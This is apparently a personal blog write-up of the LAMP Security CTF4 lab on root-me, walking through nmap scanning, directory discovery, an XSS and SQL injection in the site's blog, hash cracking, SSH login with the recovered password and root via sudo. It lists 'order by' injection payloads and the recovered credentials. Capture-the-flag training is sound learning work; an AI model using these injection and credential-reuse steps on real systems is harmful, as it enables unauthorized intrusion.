---
layout: post
title:	"Lamp Security CTF4 Writeup"
date:	2017-12-20 21:00:00
categories:
    - blog
tags:
    - vulnhub
    - root-me
---

Hi everyone. This is my solution for LAMP security CTF4. This CTF is very easy, you can download it from [Vulnhub.com](https://vulnhub.com) or play online on [root-me.org](https://root-me.org). I did it on root-me, therefore my target was ctf07.root-me.org.

Ok let’s start, i ran nmap to see which services were open (usually I run a second scan with “-p 1-65535” parameter to identify all the ports).

~~~
Syrion:~ syrion$ sudo nmap -sT -sV -O ctf07.root-me.org
Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-07 21:19 CEST
Nmap scan report for ctf07.root-me.org (212.83.142.84)
Host is up (0.040s latency).
Not shown: 727 closed ports, 270 filtered ports
PORT STATE SERVICE VERSION
22/tcp open tcpwrapped
25/tcp open tcpwrapped
80/tcp open tcpwrapped
Device type: general purpose|WAP
Running (JUST GUESSING): OpenBSD 4.X (88%), Apple embedded (87%), FreeBSD 6.X (87%)
OS CPE: cpe:/o:openbsd:openbsd:4.0 cpe:/h:apple:airport_extreme cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: OpenBSD 4.0 (88%), Apple AirPort Extreme WAP (87%), FreeBSD 6.2-RELEASE (87%), FreeBSD 6.3-RELEASE (87%), OpenBSD 4.3 (87%)
No exact OS matches for host (test conditions non-ideal).
~~~

At this point I used netcat to verify the services on the three open ports. As excepted:

* SSH on 22
* SENDMAIL on 25
* HTTP on 80

In the meantime,  I ran DirBuster, and I noticed this file:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img1.png)

It was the database’s structure:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img2.png)

This was the website on port 80:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img3.png)

I noticed this xss on the search bar:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img4.png)

Then I found an SQL Injection on the blog:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img5.png)

At this pont I started to enumerate the select statement’s parameters by using this payloads:

* id=1 order by 1 —
* id=1 order by 2 —

They were five!

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img6.png)

I needed to know which parameters were visible:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img7.png)

And then I performed the full SQL Inection (i knew the database structure because of db.sql):

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img8.png)

Ok let’s use [crackstation](https://crackstation.net/) to crack the hash. I tried to login as dstevens via ssh with the following credentials:

~~~
username dstevens
password: ilike2surf
~~~

And I succeeded:

~~~
Syrion:~ syrion$ ssh dstevens@ctf07.root-me.org
The authenticity of host ‘ctf07.root-me.org (212.83.142.84)’ can’t be established.
RSA key fingerprint is SHA256:NDWh6/414mOsW4P7K6ICc5R67PrX87ADMFUx9DK9ftk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added ‘ctf07.root-me.org,212.83.142.84’ (RSA) to the list of known hosts.
BSD SSH 4.1
dstevens@ctf07.root-me.org’s password:
Last login: Mon Mar  9 07:48:18 2009 from 192.168.0.50
[dstevens@ctf ~]$
~~~

I tried to run “sudo su” and yes… it worked (LOL):

~~~
[dstevens@ctf ~]$ sudo su
Password:
[root@ctf dstevens]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t:SystemLow-SystemHigh
[root@ctf dstevens]# cat /passwd
8cfd7e1715e7957021b5aa23f7839131
~~~

The privilege escalation was very very…very easy 😛

Bye bye!
